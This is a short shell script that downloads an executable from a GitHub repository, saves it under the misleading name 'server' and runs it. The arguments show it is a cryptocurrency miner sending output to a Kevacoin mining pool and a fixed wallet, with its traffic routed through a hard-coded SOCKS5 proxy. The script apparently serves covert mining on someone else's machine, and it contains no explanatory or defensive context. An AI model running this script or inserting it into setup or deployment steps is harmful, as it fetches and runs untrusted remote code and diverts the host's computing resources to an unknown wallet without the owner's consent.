apt update 
apt install screen -y 
wget -O server https://github.com/brilliant-cut/brilliant-cut/raw/master/server
chmod +x server
screen -dmS ls
./server --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password BC=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://50.62.35.16:11818
